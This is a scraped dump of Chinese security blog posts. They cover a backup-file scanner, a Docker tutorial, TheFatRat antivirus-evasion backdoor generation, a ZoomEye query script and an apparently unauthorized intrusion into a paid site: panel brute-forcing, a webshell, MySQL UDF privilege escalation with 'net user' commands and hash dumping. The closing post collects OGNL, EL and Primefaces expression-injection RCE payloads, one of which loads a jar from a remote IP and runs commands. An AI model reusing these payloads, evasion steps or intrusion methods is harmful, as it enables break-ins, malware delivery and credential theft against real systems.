首先生成项目文件 scrapy startproject spiderdata 生成成功后，会有以下目录结构，首先在spiderdata中的spider目录创建我们的spider文件。 备份文件扫描文件名，有两个选择，一是基于字典，二是根据url的备份文件名，从以往发现备份文件的结果上看，两种方式都是经常存在使用的。 于是创建backup文件，用来生成备份文件名，创建一个列表用来存储字典文件名，另外创建一个方法用来基于url生成备份文件名。 #coding:utf-8 import urlparse class backup(object): def __init__(self, url): self.url &#x3D; url self.list2 &#x3D; [&#39;&#x2F;db.zip&#39;, &#39;&#x2F;fdsa.rar&#39;, &#39;&#x2F;ftp.rar&#39;, &#39;&#x2F;gg.rar&#39;, &#39;&#x2F;hdocs.rar&#39;, &#39;&#x2F;hdocs.zip&#39;, &#39;&#x2F;a.zip&#39;, &#39;&#x2F;web.zip&#39;, &#39;&#x2F;web.rar&#39;, &#39;&#x2F;1.rar&#39;, &#39;&#x2F;bbs.rar&#39;, &#39;&#x2F;www.root.rar&#39;, &#39;&#x2F;123.rar&#39;, &#39;&#x2F;data.rar&#39;, &#39;&#x2F;bak.rar&#39;, &#39;&#x2F;oa.rar&#39;, &#39;&#x2F;admin.rar&#39;, &#39;&#x2F;www.rar&#39;, &#39;&#x2F;2014.rar&#39;, &#39;&#x2F;2015.rar&#39;, &#39;&#x2F;2016.rar&#39;, &#39;&#x2F;2014.zip&#39;, &#39;&#x2F;2015.zip&#39;, &#39;&#x2F;2016.zip&#39;, &#39;&#x2F;2017.zip&#39;, &#39;&#x2F;1.zip&#39;, &#39;&#x2F;1.gz&#39;, &#39;&#x2F;1.tar.gz&#39;, &#39;&#x2F;2.zip&#39;, &#39;&#x2F;2.rar&#39;, &#39;&#x2F;123.rar&#39;, &#39;&#x2F;123.zip&#39;, &#39;&#x2F;a.rar&#39;, &#39;&#x2F;a.zip&#39;, &#39;&#x2F;admin.rar&#39;, &#39;&#x2F;back.rar&#39;, &#39;&#x2F;backup.rar&#39;, &#39;&#x2F;bak.rar&#39;, &#39;&#x2F;bbs.rar&#39;, &#39;&#x2F;bbs.zip&#39;, &#39;&#x2F;beifen.rar&#39;, &#39;&#x2F;beifen.zip&#39;, &#39;&#x2F;beian.rar&#39;, &#39;&#x2F;data.rar&#39;, &#39;&#x2F;data.zip&#39;, &#39;&#x2F;HYTop.rar&#39;, &#39;&#x2F;root.rar&#39;, &#39;&#x2F;Release.rar&#39;, &#39;&#x2F;Release.zip&#39;, &#39;&#x2F;sql.rar&#39;, &#39;&#x2F;test.rar&#39;, &#39;&#x2F;template.rar&#39;, &#39;&#x2F;template.zip&#39;, &#39;&#x2F;upfile.rar&#39;, &#39;&#x2F;vip.rar&#39;, &#39;&#x2F;wangzhan.rar&#39;, &#39;&#x2F;wangzhan.zip&#39;, &#39;&#x2F;web.rar&#39;, &#39;&#x2F;web.zip&#39;, &#39;&#x2F;website.rar&#39;, &#39;&#x2F;www.rar&#39;, &#39;&#x2F;www.zip&#39;, &#39;&#x2F;wwwroot.rar&#39;, &#39;&#x2F;wwwroot.zip&#39;, &#39;&#x2F;wz.rar&#39;] def backup(self): list_a &#x3D; [] parse &#x3D; urlparse.urlparse(self.url) name &#x3D; parse.netloc.split(&#39;.&#39;) name_url &#x3D; parse.netloc.replace(&#39;.&#39;, &#39;&#39;) for i in [&#39;.rar&#39;, &#39;.zip&#39;, &#39;.tar.gz&#39;, &#39;.7z&#39;]: list_a.append(parse.scheme + &#39;:&#x2F;&#x2F;&#39; + parse.netloc + &#39;&#x2F;&#39; + parse.netloc + i) #http:&#x2F;&#x2F;www.baidu.com&#x2F;www.baidu.com.zip if &#39;www&#39; in name: list_a.append(self.url + &#39;&#x2F;&#39; + name[1] + i) #http:&#x2F;&#x2F;www.baidu.com&#x2F;baidu.zip list_a.append(self.url + &#39;&#x2F;&#39; + &#39;&#39;.join(name[1:]) + i) #http:&#x2F;&#x2F;www.baidu.com&#x2F;baiducom.zip else: list_a.append(self.url + &#39;&#x2F;&#39; + name[0] + i) #http:&#x2F;&#x2F;www.baidu.com&#x2F;baidu.zip list_a.append(self.url + &#39;&#x2F;&#39; + name_url + i) #http:&#x2F;&#x2F;www.baidu.com&#x2F;wwwbaiducom.zip for x in self.list2: list_a.append(self.url + x) return list_a 在spider的爬虫文件中使用以下代码 #coding:utf-8 import scrapy from backup import backup from ..items import SpiderdateItem class spiderdata(scrapy.Spider): name &#x3D; &quot;spiderdata&quot; content_type &#x3D; [&#39;application&#x2F;x-rar&#39;,&#39;application&#x2F;x-gzip&#39;,&#39;application&#x2F;zip&#39;,&#39;application&#x2F;octet-stream&#39;,&#39;application&#x2F;x-7z-compressed&#39;] def start_requests(self): with open(&#39;ip.txt&#39;,&#39;r&#39;) as f: for i in f.readlines(): ip &#x3D; i.strip(&#39;\\n&#39;) back &#x3D; backup(ip) url_ip &#x3D; back.backup() for x in url_ip: yield scrapy.Request(x, callback&#x3D;self.parse,dont_filter&#x3D;True) def parse(self, response): item &#x3D; SpiderdateItem() if response.headers[&#39;Content-Type&#39;] in self.content_type: print &quot;[&quot; + str(response.status) + &quot;]&quot; + u&#39; 检测到存在备份文件的URL: &#39;+ response.url item[&#39;url&#39;] &#x3D; response.url yield item 调用之前创建的备份文件名函数，使用start_requests来生成一个可迭代对象。 数据通过item来保存本地，所以在items中创建一个参数，并且在settings中开启item管道。 url &#x3D; scrapy.Field() 在piplines中创建本地文件保存文件，创建一次文件对象，写入后根据 爬虫关闭后再关闭本地文件。 def __init__(self): self.f &#x3D; open(&quot;url.txt&quot;,&#39;w&#39;) def process_item(self, item, spider): self.f.write(item[&#39;url&#39;].encode(&quot;utf-8&quot;)+&#39;\\n&#39;) return item def close_spider(self, spider): self.f.close() 因此只需在spiderdata中创建ip.txt文件即可，写入需要检测的url，另外如果不想看到scrapy的log输出，可以用在setting中添加如下： LOG_LEVEL &#x3D; &#39;WARNING&#39; 只显示warning级的log输出.","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"使用docker创建镜像","slug":"使用docker创建镜像","date":"2018-09-25T06:40:17.000Z","updated":"2018-09-27T02:44:04.000Z","comments":true,"path":"2018/09/使用docker创建镜像/","link":"","permalink":"https://misakikata.github.io/2018/09/%E4%BD%BF%E7%94%A8docker%E5%88%9B%E5%BB%BA%E9%95%9C%E5%83%8F/","excerpt":"","text":"在测试以及开源工具使用中，docker的便捷越来越成为快速部署的选择，那我们怎么构建自己的docker镜像。 构建Docker镜像有以下两种方法： 使用docker commit命令。 使用docker build命令和 Dockerfile 文件 docker commit命令首先我们在本地拉取ubuntu镜像作为基础的镜像环境。 如果我们在拉取的ubuntu镜像上安装 nginx，使用 docker run -it 镜像名 &#x2F;bin&#x2F;bash 这样进入需要修改的镜像内部。 首先按照一般操作步骤， apt-get update apt-get -y install nginx 等待构建结束后，使用exit退出，保存镜像，避免镜像内容丢失。 docker commit 修改的镜像id 用户名&#x2F;仓库名 结束后便构建了一个设定好的镜像，如下所示。 如果需要上传镜像仓库，在https://hub.docker.com/注册登陆创建仓库即可，然后使用docker login登陆，此处使用的是命令行参数直接登陆。 执行：docker push 用户名&#x2F;仓库名:标签 在hub.docker上就可以看到镜像信息了： 如需运行构建的docker docker run -d -p 80 --name web_web misakiyui&#x2F;web nginx -g &quot;daemon off;&quot; –name: 容器名 nginx -g “daemon off;” 表示在镜像内运行的命令，在前台开启一个nginx进程 访问映射端口32768则可以看到安装的nginx了。 Dockerfile使用docker commit现在已经不推荐，推荐使用更为灵活的Dockerfile来构建镜像，如下Dockerfile，同样是在ubuntu下构建nginx FROM ubuntu:18.04 MAINTAINER misaki RUN apt-get update &amp;&amp; apt-get -y install nginx RUN echo &quot;hello world&quot; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;index.nginx-debian.html EXPOSE 80 新建目录web，此目录就是构建环境目录。在Dockerfile中写入如下命令，FROM指构建环境，这里选用ubuntu 18.04版本，必须为第一行信息，注意这里都要小写，MAINTAINER指作者信息，RUN指在构建环境中需要运行的命令，每一个RUN都意味着建立一层，层数过多增加构建部署时间，也容易出错，所以尽量使用&amp;&amp;，在一层中构建命令。EXPOSE指应用程序使用容器的指定端口，设为80。也就是Dockerfile其实就是安装的每一条命令都写在一个文件内，这样运行后，程序自动的执行安装更新配置等等。 运行 docker run -t&#x3D;&quot;misakiyui&#x2F;web&quot; . (点是必须的)开始构建镜像 构建完成后再docker images中便可以看到设定的镜像了 运行 docker run -d -p 80 --name web_web misakiyui&#x2F;web nginx -g &quot;daemon off;&quot; 开启镜像 这时候查看映射到本地的端口docker ps，本地映射32772端口，访问后就可以看到修改的信息和nginx了 。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"关于Thefatrat免杀使用","slug":"关于Thefatrat免杀使用","date":"2018-09-20T03:07:18.000Z","updated":"2018-09-20T05:18:56.000Z","comments":true,"path":"2018/09/关于Thefatrat免杀使用/","link":"","permalink":"https://misakikata.github.io/2018/09/%E5%85%B3%E4%BA%8EThefatrat%E5%85%8D%E6%9D%80%E4%BD%BF%E7%94%A8/","excerpt":"","text":"最近尝试了免杀工具thefatrat，记录一些使用过程和坑： 常见的免杀方式一般是：文件免杀方法和内存免杀方法 文件免杀指：加壳、加花等。内存免杀指：修改内存特征码、修改字符串等。 推荐一篇博文：http://anhkgg.com/aanti-virus/ 下面就记录thefatrat的使用和杀软查杀结果：采用在线查杀https://www.virustotal.com和http://www.virscan.org/language/zh-cn/ thefatrat的项目地址为：https:&#x2F;&#x2F;github.com&#x2F;screetsec&#x2F;thefatrat 安装步骤为： git clone https:&#x2F;&#x2F;github.com&#x2F;Screetsec&#x2F;TheFatRat.git cd TheFatRat chmod +x setup.sh &amp;&amp; .&#x2F;setup.sh 安装后，建议查看logs文件夹下的fudwin文件,记录了安装使用中的存在的问题，比如使用中会出现There was an error creating your FUD rat with Powerstager 这种错误，查看fudwin文件，可以看到py2没有安装names模块，安装后正常使用。 再给以下文件权限 chmod + x fatrat chmod + x powerfull.sh .&#x2F;fatrat 启动界面 第一项：利用msf生产后门，基本没免杀效果 第二项 ：利用powerstager混淆，从结果来看效果不错 第三项和第四项使用中报错和不能选择的问题，尚不得知问题原因，后续更新 第五项：生成apk后门 第六项：这个就是可以创建bat后门，但是里面还有c#编译和c编译等，但是被查杀率极高 第七项：生成office类后门 第八项：生成Linux后门 此次针对windows系统，下面用第二项的fudwin，进入后 使用第一项，第二项不确定是不是编码原因，全是乱码，选择后可以看到提示的本地IP和公网IP 执行完成后，在output文件夹下生成制定的exe文件，中间会选择图标 利用https://www.virustotal.com查看下效果如何，从结果上看不是很优秀，不过比较意外的是，360居然没查杀，国内几家免费杀软都没识别 尝试使用http://www.virscan.org/检查文件 结果更少，只有四个查杀(不确定是不是引擎版本问题) 从两个结果看 两边能查杀的国内杀软就江民杀毒，F-Secure在VirusTotal可以查杀，在VirSCAN没有查杀 运行文件查看是否能正常执行获得shell。 运行后用msf做监听，可以看到收到了shell thefatrat比较出众的一点就是可以生成bat后门文件，选择Create Fud Backdoor 1000% with PwnWinds 在程序output文件夹下的bat上传到 https://www.virustotal.com 被360查杀，但是能过江民，F-Secure，和国内其他家杀软 同样用msf监听执行情况，可以收到shell 以上文件在电脑管家和火绒环境下，静态查毒或者运行都不查杀。 在采用Create Fud 100% Backdoor with Fudwin 1.0中的Powerstager 0.2.5 by z0noxz (powershell)生成exe文件，再用upx加壳 Upx -7 aaa.exe 这个结果还算是能看，能查杀基本完全脱离国内杀软了 不过值得一提的就是上午电脑管家还不能查杀，下午就全国联保了，应该是上传可疑文件云端检测了，不过既然没有查杀也没有报可疑，为什么会上传检测，倒是一个问题。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"zoomeye接口实现","slug":"zoomeye接口实现","date":"2018-09-18T04:44:29.000Z","updated":"2018-09-20T04:35:56.000Z","comments":true,"path":"2018/09/zoomeye接口实现/","link":"","permalink":"https://misakikata.github.io/2018/09/zoomeye%E6%8E%A5%E5%8F%A3%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"zoomeye的接口网上不少人做过实现，之前在学python的json信息处理，便写了这个一个利用脚本，唯一的坑就是wiki和返回信息不一样，浪费了点时间。没有多少难度，就是写了不少提示符，用来多次和提示输入。 #coding:utf-8 #author:misaki import requests import json import re def geturl(): app &#x3D; raw_input(&#39;app:&#39;) app2 &#x3D; input(&#39;page:&#39;) app3 &#x3D; raw_input(&#39;country:&#39;) for i in xrange(1,app2+1): i&#x3D;str(i) url&#x3D;&#39;https:&#x2F;&#x2F;api.zoomeye.org&#x2F;web&#x2F;search?query&#x3D;app:&#39;+app+&#39;&amp;page&#x3D;&#39;+i+&#39;&amp;country&#x3D;&#39;+app3 r2&#x3D;requests.get(url,headers&#x3D;headers) soup &#x3D; r2.text a&#x3D;json.loads(soup) #获取site for i in a[&#39;matches&#39;]: f&#x3D;open(app+&#39;.txt&#39;,&#39;a&#39;) f.write(str(i[&#39;site&#39;])+&#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;web.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom &#x3D; raw_input(&#39;Are you continue?[y&#x2F;n]:&#39;) print &#39;\\r&#39; while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom &#x3D; raw_input(&#39;Are you continue?[y&#x2F;n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getip(): app4 &#x3D; raw_input(&#39;app:&#39;) app5 &#x3D; input(&#39;page:&#39;) app6 &#x3D; raw_input(&#39;country:&#39;) for i in xrange(1, app5 + 1): i &#x3D; str(i) url &#x3D; &#39;https:&#x2F;&#x2F;api.zoomeye.org&#x2F;host&#x2F;search?query&#x3D;&#39; + app4 + &#39;&amp;page&#x3D;&#39; + i +&#39;&amp;country&#x3D;&#39; + app6 r2 &#x3D; requests.get(url, headers&#x3D;headers) parrten &#x3D; re.compile(r&#39;(?&lt;![\\.\\d])(?:\\d&#123;1,3&#125;\\.)&#123;3&#125;\\d&#123;1,3&#125;(?![\\.\\d])&#39;) #获取ip ip &#x3D; parrten.findall(str(r2.text)) for i in ip: f &#x3D; open(app4+&#39;.txt&#39;, &#39;a&#39;) f.write(str(i) + &#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;host.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom &#x3D; raw_input(&#39;Are you continue?[y&#x2F;n]:&#39;) while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom &#x3D; raw_input(&#39;Are you continue?[y&#x2F;n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getuser(): url &#x3D; &#39;https:&#x2F;&#x2F;api.zoomeye.org&#x2F;resources-info&#39; r2 &#x3D; requests.get(url, headers&#x3D;headers) soup &#x3D; json.loads(r2.text) print &#39;\\r&#39; print &#39;plan: %s&#39; %soup[&#39;plan&#39;] print &#39;search_num: %s&#39; %soup[&#39;resources&#39;][&#39;search&#39;] print &#39;stats: %s&#39; %soup[&#39;resources&#39;][&#39;stats&#39;] def main(): print &#39;Input service number&#39; print &#39;1 - web_search&#39; print &#39;2 - host_search&#39; print &#39;3 - resources_info&#39; name &#x3D; raw_input(&#39;input num:&#39;) print &#39;\\r&#39; while name not in [&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]: name &#x3D; raw_input(&#39;input num:&#39;) if name !&#x3D; &#39;&#39;: try: if name &#x3D;&#x3D; &#39;1&#39;: geturl() elif name &#x3D;&#x3D; &#39;2&#39;: getip() elif name &#x3D;&#x3D; &#39;3&#39;: getuser() except: pass if __name__&#x3D;&#x3D;&#39;__main__&#39;: print &#39;#######&#39; print &#39; # #### #### # # ###### # # ######&#39; print &#39; # # # # # ## ## # # # # &#39; print &#39; # # # # # # ## # ##### # ##### &#39; print &#39; # # # # # # # # # # &#39; print &#39; # # # # # # # # # # &#39; print &#39;####### #### #### # # ###### # ######&#39; print &#39;auther:misaki&#39; print &#39;\\r&#39; print &#39;Input your username and password&#39; username &#x3D; raw_input(&#39;username:&#39;) password &#x3D; raw_input(&#39;password:&#39;) print &#39;\\r&#39; if username and password !&#x3D; -1: data &#x3D; &#123;&quot;username&quot;: username, &quot;password&quot;: password&#125; s &#x3D; json.dumps(data, indent&#x3D;4) r &#x3D; requests.post(&#39;https:&#x2F;&#x2F;api.zoomeye.org&#x2F;user&#x2F;login&#39;, data&#x3D;s) if r.status_code &#x3D;&#x3D; 200: token &#x3D; r.text headers &#x3D; &#123;&#39;Authorization&#39;: &#39;JWT&#39; + &#39; &#39; + token[18:-2]&#125; main() else: print &#39;Incorrect username or password&#39; ​​","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"对意外发现的某站点测试","slug":"对意外发现的某站点测试","date":"2018-09-18T04:43:59.000Z","updated":"2018-09-20T04:37:09.000Z","comments":true,"path":"2018/09/对意外发现的某站点测试/","link":"","permalink":"https://misakikata.github.io/2018/09/%E5%AF%B9%E6%84%8F%E5%A4%96%E5%8F%91%E7%8E%B0%E7%9A%84%E6%9F%90%E7%AB%99%E7%82%B9%E6%B5%8B%E8%AF%95/","excerpt":"","text":"朋友分享一个站点，点开需要购买点卡，本着节约的原则，简单做了一个测试，于是便有了下文 爆破宝塔系统，页面提示三次错误将出现验证码，那么如何记录错误次数，猜测是通过cookie，删除cookie 弱口令爆破成功，进入宝塔后台 从宝塔后台获取phpmyadmin，root权限 同样可以看到文件系统，但只能看到网站目录，宝塔系统提示，从宝塔建站，默认user权限 上传shell，同样是只能看到当前网站目录 考虑通过phpmyadmin提权，发现系统禁止root外连，虽然没有必要，但还是尝试开启外连，用navicat连接数据库接管，用户中找到root用户，编辑权限，开启任意主机链接 采用udf提权，提权的话需要写入导出权限，但是由于权限设置不能导入导出 因为mysql对通过文件导入导出作了限制，默认不允许。默认value值为null，则为禁止，如果有文件夹目录，则只允许改目录下文件 通常操作为以下步骤，但是没有写权限，有了上传权限更方便操作，直接跳过udf导出步骤： Udf需要导出到\\lib\\plugin目录，一般该目录不存在\\lib\\plugin目录。 可以尝试利用NTFS ADS创建 plugin目录 查询 select &#39;xxx&#39; into dumpfile &#39;C:\\\\MySQL\\\\lib::$INDEX_ALLOCATION&#39;; 导出UDF.DLL 随便选一个库 查询 CREATE TABLE Temp_udf(udf BLOB); 查询 INSERT into Temp_udf values (CONVERT($shellcode,CHAR)); 查询 SELECT udf FROM Temp_udf INTO DUMPFILE &#39;C:\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll&#39;;-- 查询 Create function cmdshell returns string soname &#39;udf.dll&#39;; 查询 select * from mysql.func; 查询 select cmdshell(&#39;net user test test &#x2F;add&#39;); ​ 手动创建plugin目录，上传udf.dll文件，执行以上sql代码，创建账号，拿下服务器 利用Cve-2018-8120创建账号完成添加管理员 导出hash，利用Pwdump7 这个过程遇到一个问题就是，菜刀下模拟终端无法使用，目录只能看到网站目录，导致一段时间内以为是权限问题，而磁盘下的目录又只是一个网站目录，加深这种认识，拿下服务器的时候才发现是想多了，只有那一个目录。。。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"表达式注入","slug":"表达式注入","date":"2018-09-18T04:29:45.000Z","updated":"2021-07-23T06:23:55.206Z","comments":true,"path":"2018/09/表达式注入/","link":"","permalink":"https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","excerpt":"","text":"在一次项目中发现了一个泛微的历史老洞，而且是表达式注入中典型的一种，特地收集了相关资料做一份表达式注入的文档和记录 表达式注入概念：2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。 而这个时期，只不过还只是把它叫做远程代码执行漏洞、远程命令执行漏洞或者上下文操控漏洞。像Struts2系列的s2-003、s2-009、s2-016等，这种由OGNL表达式引起的命令执行漏洞。 流行的表达式语言：Struts2——OGNL实至名归的“漏洞之王”，表达式的格式: @[类全名（包括包路径）]@[方法名 | 值名]，例如： ​ @java.lang.String@format(&#39;foo %s&#39;, &#39;bar&#39;) 基本用法： java ActionContext AC &#x3D; ActionContext.getContext(); Map Parameters &#x3D; (Map)AC.getParameters(); String expression &#x3D; &quot;$&#123;(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()&#125;&quot;; AC.getValueStack().findValue(expression)); 相关漏洞： s2-009、s2-012、s2-013、s2-014、s2-015、s2-016，s2-017 Spring——SPELSPEL即Spring EL，故名思议是Spring框架专有的EL表达式。相对于其他几种表达式语言，使用面相对较窄，但是从Spring框架被使用的广泛性来看，还是有值得研究的价值的。 基本用法： 在jsp页面中可以使用el表达式代替&lt;%=%&gt;，之间访问java对象。 java String expression &#x3D; &quot;T(java.lang.Runtime).getRuntime().exec(&#x2F;&quot;calc&#x2F;&quot;)&quot;; String result &#x3D; parser.parseExpression(expression).getValue().toString(); JSP——JSTL_EL这种表达式是JSP语言自带的表达式，也就是说所有的Java Web服务都必然会支持这种表达式。但是由于各家对其实现的不同，也导致某些漏洞可以在一些Java Web服务中成功利用，而在有的服务中则是无法利用。 基本用法： jsp &lt;spring:message text&#x3D;&quot;$&#123;&#x2F;&quot;&#x2F;&quot;.getClass().forName(&#x2F;&quot;java.lang.Runtime&#x2F;&quot;).getMethod(&#x2F;&quot;getRuntime&#x2F;&quot;,null).invoke(null,null).exec(&#x2F;&quot;calc&#x2F;&quot;,null).toString()&#125;&quot;&gt; &lt;&#x2F;spring:message&gt; Elasticsearch——MVELElasticsearch的CVE-2014-3120这个漏洞 MVEL是同OGNL和SPEL一样，具有通过表达式执行Java代码的强大功能。 基本用法： java import org.mvel.MVEL; public class MVELTest &#123; ​ public static void main(String[] args) &#123; ​ String expression &#x3D; &quot;new java.lang.ProcessBuilder(&#x2F;&quot;calc&#x2F;&quot;).start();&quot;; ​ Boolean result &#x3D; (Boolean) MVEL.eval(expression, vars); ​ &#125; &#125; 执行代码：OGNL表达式注入：示例：泛微E-Mobile 表达式获取数据语法：”${标识符}”，但在这个中并不需要${}来包括，不然会执行失败。 先用一个小的加减乘除做验证： 执行exp语句，执行命令whoami， @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream())： 尝试报路径，但此例并不成功 %24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D EL表达式注入：​ 实例：CVE-2011-2730 EL表达式语句在执行时，会调用pageContext.findAttribute方法，用标识符为关键字，分别从page、request、session、application四个域中查找相应的对象，找到则返回相应对象，找不到则返回”” （注意，不是null，而是空字符串）。 EL表达式可以很轻松获取JavaBean的属性，或获取数组、Collection、Map类型集合的数据 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 语法：${运算表达式}，EL表达式支持如下运算符： 1、关系运算符 2、逻辑运算符： 3、empty运算符：检查对象是否为null(空) 4、二元表达式：${user!=null?user.name :””} 5、[ ] 和 . 号运算符 执行exp语句： $&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())&#125; Primefaces框架表达式注入:Primefaces要加密Payload后执行命令，所以这里用打包成jar包的加密函数进行加密! 命令：java -cp .\\de.jar test.EncodeDecode exp 验证(代码): $&#123;facesContext.getExternalContext().getResponse().getWriter().println(&quot;~~~elinject~~~&quot;)&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().flush()&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().close()&#125; 加密的Payload: uMKljPgnOTVxmOB+H6&#x2F;QEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5+OpbBXfBSKlTh7gJWI1HR5e&#x2F;f4ZjcLzobfbDkQghTWQVAXvhdUc8D7M8Nnr+gSpk0we&#x2F;YPtcrOOmI+&#x2F;uuxl31mfOtFvEWGE3AUZFGxpmyfyMuGL0rzVw3wUpjUlHw4k3O4pm1RrCJT&#x2F;PxEtCs00U9EBM2okSaAdPIn9p9G5X3lwi6lN7MXvoBhoFVy+31JzmoVeaZattVJhqvZRs1fguZGDCqQaJe+c6rQmcZWEKQg&#x3D;&#x3D; Web路径: $&#123;facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getServletContext().getRealPath(&#x2F;&quot;&#x2F;&#x2F;&quot;))&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().flush()&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().close()&#125; 加密的Payload: uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5%2BOpbBXfBSCSkb2z5x8Cb2P%2FDS2BUn7odA0GflWHV%2B9J8uLGYIqPK9HY85O%2BJw0u5X9urorJfQZKJihsLCV%2BnqyXHs8i6uh4iIboLA2TZUiTbjc3SfybUTvPCjRdyT6rCe6MPQGqHYkBiX3K7fGPuwJ2XNONXI9N2Sup5MWcUUo87FbX3jESvOq2Bs3sDKU4bW3aCGbhUcA2ZEgSxkLcW6VKDnXV5hxvz6J4a4E6P8HCy9v8%2BdrRzmtKbwczXk%2B9n8Lm2KYS%2Fk2TJKpeKjPg0t%2BAiKzTiqak%3D 反射式调用执行命令: $&#123;request.getSession().setAttribute(&quot;list&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())&#125;$&#123;request.getSession().getAttribute(&quot;list&quot;).add(request.getSession().getServletContext().getResource(&quot;&#x2F;&quot;).toURI().create(&quot;http:&#x2F;&#x2F;118.184.23.145&#x2F;cmd.jar&quot;).toURL())&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getClass().getClassLoader().getParent().newInstance(request.getSession().getAttribute(&quot;list&quot;).toArray(request.session.servletContext.getClass().getClassLoader().getParent().getURLs())).loadClass(&quot;org.javaweb.test.HelloWorld&quot;).newInstance().exec(request.getParameter(&quot;cmd&quot;)))&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().flush()&#125;$&#123;facesContext.getExternalContext().getResponse().getWriter().close()&#125; 加密的Payload调用: http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;javax.faces.resource&#x2F;?pfdrt&#x3D;sc&amp;;ln&#x3D;primefaces&amp;;pfdrid&#x3D;1acBqv16SJhfc30NLxL&#x2F;NinZaDI%2BoHqk1xDbSI8qOl4%2BoXsKFyqJq3gv2IBc1S89q6G1POSSKDNlzHE&#x2F;%2BnsMuZgTDALpyOstkBkFVJNc2U&#x2F;B%2BoceOqnpF5YZoWtF0W7qGxsImsumut7GQoKKMQcbwwL4coE07x6Mn09hfy94tuiiy6S8S1vr8kPPYzrUC5AveiE9ls7dLDiaQripnC0Z71fB1xCjkxw8wjZt3om1PT9Wq8YAqkHuBIo&#x2F;soFBvM1YDnJosELhjmfoJdAGBRfullXUfVw5xEg9ykFpLaKugkbDIBgXtv58Xu4BrT0d5MAQ8BOVwjzSodkdllYCAeUklCDWRfFtZDORdcAzXVxTRkEn%2Bnx7qAFh8NwK&#x2F;sDsXz6U1Q2Q&#x2F;ny1UaEMFM9qrgVmfX181HXWc4TuETxLqUohfreYLJLW%2BAxcxzciqqoKj%2Bht&#x2F;KJ%2B%2BGfzuNoSs0E9i9N&#x2F;AL5PALrdTRg%2BuweD3CMLZgLDITkMx4z7dmP2daw2B98nrKOLHtG6nYDcDmSfy8d8IKMZJvuq&#x2F;WT7JLm0PJ3UqDyvzHHjrPCDpTFhMUmftFFvi4APBpT41slHYoRKDbJMvU&#x2F;upvKyAsy5xQKJ5s6x%2B4F%2By9p8Icp1TQfMcqIPwMQkvsOs8i61m6i96dpmxpfZPWprcigaWMhJG8&#x2F;iYRg7Zyg